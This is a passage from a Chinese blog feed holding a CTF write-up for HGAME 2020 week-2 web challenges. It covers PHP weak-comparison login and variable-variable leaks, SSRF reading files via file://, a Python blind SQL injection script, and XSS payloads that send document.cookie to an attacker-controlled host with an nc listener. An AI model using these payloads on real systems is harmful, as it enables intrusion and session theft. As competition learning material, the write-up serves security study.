&lt;div style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Welcome &lt;?php echo $_SESSION['</span>username<span class="string">'];?&gt; &lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;form action="" method="post"&gt;</span></span><br><span class="line"><span class="string">            &lt;fieldset style="width: 30%;height: 20%;float:left"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;插入图片&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;label&gt;图片url: &lt;input type="text" name="img_url" placeholder=""&gt;&lt;/label&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;button type="submit" name="submit"&gt;插入&lt;/button&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="width: 30%;height: 20%;float:left"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;评论管理&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;待开发..&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="width: 30%;height: 20%;"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;文章列表&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;待开发..&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="height: 50%"&gt;</span></span><br><span class="line"><span class="string">            &lt;div style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">                &lt;img height='</span><span class="number">200</span><span class="string">' width='</span><span class="number">500</span><span class="string">' src='</span>data:image/jpeg;base64,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> insert_img() ? insert_img() : base64_encode(file_get_contents(<span class="string">"static/error.jpg"</span>)); <span class="meta">?&gt;</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>那么不难发现几个源码里的要点：<br>index.php中：<br>ban掉了flag与config。而后面可以注意到config.php被admin.php与login.php包含(include)了。</p><p>login.php中<br>1.存在一个参数debug,以及对这参数的<code>eval()</code>。也就是说我们获得了一个可控可执行的参数，但是要绕正则。<br>2.稍微注意下，登录时<code>username</code>以及<code>password</code>均需与对应的参数（肯定在config.php中，所以我们不可能通过其他途径登录）相等。但是password偏偏是<code>==</code>的弱类型相等。这就代表password一定会有漏洞。且甚至可以猜到，password的md5值开头是0e。这样才会有弱类型比较漏洞利用。</p><p>admin.php中<br>1.下面一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$c = curl_init();</span><br><span class="line">curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$res = curl_exec($c);</span><br><span class="line">curl_close($c);</span><br><span class="line">$avatar = base64_encode($res);</span><br></pre></td></tr></table></figure><p>有点眼熟，再加上前面一段对host的判别，可以想见是存在ssrf漏洞。（虽然我不熟）百度一下，发现这果然是ssrf漏洞的经典代码。也提醒了我要准备学习ssrf的笔记了……</p><p>然后就是存在一个图片插入的功能。而且它会返回base64编码后的<code>file_get_contents()</code>结果。这也是ssrf利用中能拿到回显结果的重要细节。</p><p>所以思路很清晰了，从login.php下手，登录后台，利用ssrf拿到根目录下的flag。</p><p>首先是关于<code>debug</code>参数的利用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br></pre></td></tr></table></figure><p>主要是这段代码，自己开始只理解成过滤了一堆东西……后来百度下，突然想起来原来ichunqiu上做过的一道题。叫做爆破-1。但实际上是一个全局变量的利用（因为它include了flag.php,所以传参<code>globals</code>就能通过<code>eval($$a)</code>拿flag）。而这题同样也include了config.php……回过头看正则，就会发现这个正则其实恰好限定了传参为变量名。具体参考stackoverflow：<br><a href="https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php" target="_blank" rel="noopener">https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php</a><br>它要求开头第一个字母可以是字母下划线及不可见字符，后面其他字母可以是字母数字及不可见字符。（\x7f-\xff 确切的说，可以匹配utf-8编码中的非ascii编码字符）。总之确定可以传参数后，我们试试<code>GLOBALS</code><br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/3.jpg" alt="GLOBALS"><br>直接拿到用户名Cosmos!，以及密码是0e开头的事实。故选个0e开头MD5的字符串登录进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cosmos!</span><br><span class="line">s878926199a</span><br></pre></td></tr></table></figure><p>进去后我也卡了好久……ssrf不熟，只能盲目的试。能确定的是需要host被解析为<code>localhost</code>,尝试直接<code>http://localhost</code>但是回显总是那张报错的图。唯一不同的在于，当我尝试<code>http://localhost/flag</code>时，返回的是404,也就是说curl成功执行了。所以说，flag应该是在服务器根目录，不是网站根目录。问题变为怎么读了。在查阅资料时突然注意到file协议可以读文件。于是换下file://协议<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/4.jpg" alt="flag.PNG"><br>居然成了。。。解码可拿到flag。后来郁师傅解释说，因为index.php存在302，curl不能跟随，获取是空的。结合源码中获取为空则返回错误图片这点，就明白了为什么<code>http://localhost</code>总是没结果<br>但我估计还有其他方法做，这里马一手。</p><h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>说来惭愧，这题开始我ip又被ban了hhhh。好在貌似是题目问题，后来出题人调整了就好了。首先根据FUZZ可以确认存在sql注入。输入1回显正常，输入<code>1&#39;</code>无回显。输入<code>1&quot;</code>回显正常。那么显然，这是盲注的味道。因为只有正确错误两种回显方式，所以确认是布尔盲注。</p><p>然后fuzz了下ban掉的关键字：<br>空格，可以用<code>%0a</code>替代</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></figure><p>关键字可以双写绕过</p><p>那不多说直接放盲注脚本了。整体还是比较简单的（之前总结的模板直接拿来套hhh）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="comment">#hgame&#123;w0w_sql_InjeCti0n_Is_S0_IntereSting!!&#125;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">"http://139.199.182.61/index.php?id=1'and%0aascii(substr((selselectect%0afl4444444g%0afrom%0af1aggggggggggggg),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">        <span class="comment">#print(payload）</span></span><br><span class="line">        res=requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>: <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h1><p>这道题确切说不算难题吧。但是自己仍然耗费了2个多小时在这上面，感觉挺划不来的……</p><p>话不多说，先看题目<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/5.jpg" alt="源码"></p><p>初始进去发现有源码及回显。<br>源码很简洁，关键在于<code>file_get_contents(&#39;mycode&#39;);</code>开始习惯性以为是<code>file_get_contents()</code>的命令执行漏洞。但是仔细看，我们并没有可控参数。因为这里的<code>&#39;mycode&#39;</code>指代的其实是filename,如果有疑问，那么不妨放到php中看看<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/6.jpg" alt="filename"><br>也就是说，mycode是一个文件，而且回显的不知名内容也是mycode里面的。</p><p>回显就不简单了，看似是base64，但解码后仍然是未知编码。那么我们从mycode下手。由源码可知，mycode应该是跟index.php在同一个目录下的，故访问之。得到源码<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/7.jpg" alt="mycode"><br>可以知道，它定义了一个加密函数，并对<code>$_SERVER[&#39;token&#39;]</code>进行了多重编码。只要我们post的token与服务器的token相同即可拿到flag。</p><p>开始我想，这不是很简单吗，把编码倒过来解码不就好了？但是解出token后发现没有拿到flag，仔细回到原页面，发现一个大问题：<br>mycode中用于加密<code>$_SERVER[&#39;token&#39;]</code>的源码是变化的。唯一不变的是加密函数的数量总是10个，而加密函数的种类只有<code>encrypt()</code>,<code>base64_encode()</code>,<code>strrev()</code>,<code>str_rot13()</code>而这体现在index.php上回显的内容也是不断变换的。且基本上几秒钟就换掉了。也就是说，我们只能靠脚本解决，而不可能人手解决。<br>(当然，也许可以把几种孤零零的加密顺序的可能性不断试也许刚好碰对了。但这无异于大海捞针，就没有意义了。)</p><p>首先这里先权衡下脚本的书写方式。开始我是想用php脚本的。但是我不会php中与python里requests库有相同功能的知识，那就只能用python脚本了。但随之而来的问题是，我们需要把加密的函数改一改，而且python里还没找到rot-13decode的库……（我就是因为找了个错的rot-13解码脚本导致白花了快一个小时）</p><p>所以我的思路是这样的，请求两个页面，分别用正则拿到回显内容，以及mycode里10个加密函数组成的字符串。我再另写一个函数匹配字符串，每匹配到一个函数名字符串执行对应的解密函数。（稍微解释下，因为自己一开始弄反了。我们解密是要对回显内容从外向里解，故调用的函数顺序与我们从mycode里获得加密函数字符串中函数的顺序是一致的。<br>比如加密方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$密码&#x3D;base64_encode(str_rot13(strrev($原码)))</span><br></pre></td></tr></table></figure><p>我们需要：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(strrev(str_rot13(base64_decode($密码))))</span><br></pre></td></tr></table></figure><p>来得到原码。<br>但我封装好的匹配函数的调用顺序仍是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64_decode , str_rot13(), strrev()</span><br></pre></td></tr></table></figure><p>被自己一开始的php脚本的固化印象影响，弄反了顺序导致老是报错。不太应该。话不多说，贴脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_rot13</span><span class="params">(s, OffSet=<span class="number">13</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encodeCh</span><span class="params">(ch)</span>:</span></span><br><span class="line">        f = <span class="keyword">lambda</span> x: chr((ord(ch) - x + OffSet) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">return</span> f(<span class="number">97</span>) <span class="keyword">if</span> ch.islower() <span class="keyword">else</span> (f(<span class="number">65</span>) <span class="keyword">if</span> ch.isupper() <span class="keyword">else</span> ch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strrev</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(str)</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str)):</span><br><span class="line">        res+= chr(ord(str[i]) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec</span><span class="params">(string,token)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'encrypt'</span>:</span><br><span class="line">        <span class="keyword">return</span> decrypt(token)</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'str_rot13'</span>:</span><br><span class="line">        <span class="keyword">return</span> str_rot13(token)</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'base64_encode'</span>:</span><br><span class="line">        f=str(base64.b64decode(token),<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'strrev'</span>:</span><br><span class="line">        <span class="keyword">return</span> strrev(token)</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://76c59cdfab.php.hgame.n3ko.co'</span></span><br><span class="line">url1=<span class="string">'http://76c59cdfab.php.hgame.n3ko.co/mycode'</span></span><br><span class="line"></span><br><span class="line">res=requests.get(url)</span><br><span class="line">res1=requests.get(url1)</span><br><span class="line">key=re.findall(<span class="string">r'(.*)&lt;br&gt;'</span>,res.text)[<span class="number">2</span>]</span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line">key1=re.findall(<span class="string">r'echo\((.*)\$'</span>,res1.text)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(key1)</span></span><br><span class="line">key1=key1.replace(<span class="string">'('</span>,<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line"><span class="comment">#print(key1)</span></span><br><span class="line">token=key</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    text = re.findall(<span class="string">r'(.*?)&lt;br&gt;'</span>, key1)[i]</span><br><span class="line">    token=exec(text,token)</span><br><span class="line"></span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'token'</span>:token</span><br><span class="line">&#125;</span><br><span class="line">flag=requests.post(url=url,data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure><p>其中为了方便，把几个解密函数重新封装一下。<code>decrypt()</code>很好写，<code>str_rot13()</code>从网上嫖的。<code>exec()</code>就是用于匹配字符串并执行的函数，注意其中的base64要转字符串形式，不然解出来是二进制data；之后的<code>key</code>与<code>key1</code>分别用于获取请求的内容中我们要利用的回显与函数部分。这里需要自己调整一下,比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2]</span><br></pre></td></tr></table></figure><p>我用re的<code>findall()</code>函数，由于返回的是列表故要记得根据<code>res.text</code>调整对应的下标。<br>之后我也用正则函数，匹配出函数字符串，去掉括号部分，并在之后调用<code>exec()</code>函数时，再次利用<code>findall()</code>的匹配得到函数名组成的列表，依次调用。最后解出token，post请求拿到flag。<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/17.jpg" alt="flag"><br>从flag也可以看出，我们也能用php脚本……然而我tcl而不会，不然可以省掉不少时间。</p><h1 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h1><p>  花了最长时间的一道题……但毕竟是对我来说最难的一道了，做的非常辛苦但是又有许多收获。所以就着重笔墨多记录下这道题，顺便当自己的学习笔记好了。</p><p>进入界面<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/8.jpg" alt="界面"></p><p>首先当然是判断漏洞类型了。<br>从题目名字可以知道，可能是个前端漏洞。由于界面开始就提供了一个<code>Flag is here</code>的button。点击进去后发现提示<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/9.jpg" alt="token"><br>这里直接说明我们需要admin的token才能拿到flag。好的，前端+token，应该不难想到需要我们通过xss打到admin的cookie来获取token了。<br>然后整理下思路，大概是如此:通过message提交payload。然后下面一个验证码code用脚本跑出来。每次点击’提交’时，就会把之前传过的所有message都发给bot。bot自然是带有admin权限的了，那么它访问时触发我们的payload,我们拿到token就可以访问/flag了。</p><p>下面的验证方式并不难，只是会强行耗时间。通常用脚本跑出来都是7,8位数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999999999</span>):</span><br><span class="line">     code=hashlib.md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">     print(code[:<span class="number">6</span>])</span><br><span class="line">     <span class="keyword">if</span> code[:<span class="number">6</span>]==<span class="string">'bfa9a6'</span>:</span><br><span class="line">         print(i)</span><br><span class="line">         <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>但是message的处理就不简单了。简单的fuzz后会发现存在过滤与特殊处理。这点之后再说。好在题目说明了，等我们测试成功后再提交验证码。这样所有内容都能交到adminbot手上，不至于狂跑脚本浪费时间。</p><p>其实自己在这道题之前并没有真正意义上做过xss打cookie类型的题目。头一次听说是在校赛上一道simple_xss的题目。那道题就是简单的过滤下用xss打cookie（当时题目出了不少bug，甚至源码泄露直接拿flag都行……）。不过我只知道最基础的xsspayload，根本不会利用xss打cookie。于是自己先选择百度+google，得知需要xss平台。<br>我用的这个在线网站：<a href="http://xsspt.com/" target="_blank" rel="noopener">http://xsspt.com/</a><br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/10.jpg" alt="平台"><br>于是明白，其实就是在xss平台创建一个项目，添加默认模板以及xss.js模板,之后只要在xss漏洞处尝试平台提供给我们的payload即可。比如：<img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/11.jpg" alt="payload"><br>即可执行xss打cookie。上面项目几个记录都是我在本地的DVWA上用xss-reflected这个漏洞的low级别的输入打的。</p><p>同时也注意到几点，以上payload基本上是这样几个形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;script src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">2.&lt;img src&#x3D;x onerror&#x3D;eval(atob(&#39;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL21sUkpNbj8nK01hdGgucmFuZG9tKCk&#x3D;&#39;))&gt;</span><br><span class="line"></span><br><span class="line">3.javascript:eval(&#39;window.s&#x3D;document.createElement(&quot;script&quot;);window.s.src&#x3D;&quot;&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&quot;;document.body.appendChild(window.s)&#39;)</span><br></pre></td></tr></table></figure><p>我分之为3种：<br>1.<code>&lt;script&gt;</code>标签的经典payload。src属性是外部引用<br>2.<code>&lt;img&gt;</code>标签的onerror属性，也是一种经典payload。同时用上<code>eval(atob())</code>处理base64字符串来bypass。还原下是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn?&#39;+Math.random()</span><br></pre></td></tr></table></figure><p>3.以及第三种javascript伪协议。有效避免了尖括号的存在。<br>上面1,2两种payload我都用DVWA打到cookie了。第三种不行。</p><p>回到题目中来，这道题目的过滤比想象中严格的多。我把做题时的FUZZ结果贴下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.script关键字被转为 Hi there!</span><br><span class="line">2.输入内容转为大写</span><br><span class="line">3.标签整体过滤&lt;&gt;</span><br></pre></td></tr></table></figure><p>第一点还好，<code>script</code>过滤了还有诸如<code>img</code>,<code>svg/onload</code>等等payload。<br>第二点有点难办，因为通常标签包括属性大写后仍然能正常处理（大写绕过是一种常见的绕过script的方法），但是连属性的值都大写会严重影响我的payload正常执行。比如<code>ALERT(1)</code>是没法执行的。xss平台上第二种payload<code>base64</code>+<code>eval()</code>也是不行的。因为大写后函数不能正常执行了，编码也错误了。<br>第三点非常难办，只要有标签就给滤掉。没有什么别的绕过方法。<br>所以xss平台提供的payload全军覆没，必须想绕过方法。</p><p>这时我想到了去年暑假自己写的一篇文章。是关于xss.me上的xss挑战的。当时基本上一路看着wp做过来，好多都没什么印象。但现在再看却发现了意外宝藏：<a href="https://www.jianshu.com/p/18473e2174f3" target="_blank" rel="noopener">https://www.jianshu.com/p/18473e2174f3</a><br>比如<img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/12.jpg" alt="&lt;&gt;的绕过"><br>还有：<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/13.jpg" alt="大写的绕过"></p><p>所以这里可以不闭合标签，利用实体编码完成xss。(没想到要靠自己的文章解决……好嘲讽啊)<br>好的，解决了尖括号与大写的问题后再解决一下<code>script</code>的问题吧。这里我找到了sky师傅之前做的xss题目以及他做往年hgame时对xss的绕过。<br><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/" target="_blank" rel="noopener">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br><a href="https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/" target="_blank" rel="noopener">https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/</a></p><p>第一道题xss部分过滤了许多关键字，比如<code>script</code>以及<code>onerror</code>但是可以用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"document.location='vpsip:port'"</span>&gt;</span><br></pre></td></tr></table></figure><p>(这里同时也提醒我，不一定要用xss平台，用vps上的nc监听也可以。)<br>同时用下面的payload打cookie:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"document.location='vpsip:port/?'+document.cookie"</span>&gt;</span><br></pre></td></tr></table></figure><p>这里是用网页ip后的参数带出cookie。看到后面我的结果就明白了。<br>加上师傅hgame的payload其中的charcode部分其实就是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href=<span class="string">"vpsip:port/?s="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>所以明白了获取cookie的payload格式。那么对此题，我们的理想payload就是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"window.location.href="</span>ip:<span class="number">7788</span>/?s=<span class="string">"+document.cookie;"</span>&gt;</span><br></pre></td></tr></table></figure><p>这里我出于隐私把自己的ip滤掉，只显示我监听的是7788端口。</p><p>那么编码，去尖括号后，我们实际提交的payload为：(这里我把ip换成127.0.0.1)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x37;&amp;#x38;&amp;#x38;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;"</span></span><br></pre></td></tr></table></figure><p>在题目界面提交后我们看看有没有成功插入<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/14.jpg" alt="message payload"><br>可以看到，虽然回显显示的一个无内容的方框。但我的payload被成功解析。<br>同时在vps上监听端口7788</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7788</span><br></pre></td></tr></table></figure><p>提交脚本跑出来的code，收到Success的同时查看服务器<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/15.jpg" alt="token"><br>成功带出token。那么用bp换token访问/flag吧。<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/16.jpg" alt="flag"></p><p>这道题真的花了很久。毕竟自己在此之前没接触过一道xss打cookie的真题。但是还是靠着网上知识学到了许多，成功拿到自己的flag。所以要多多向各位dalao以及百度谷歌学习啊。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭电hgame-week1</title>
      <link href="2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/"/>
      <url>2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/</url>
      
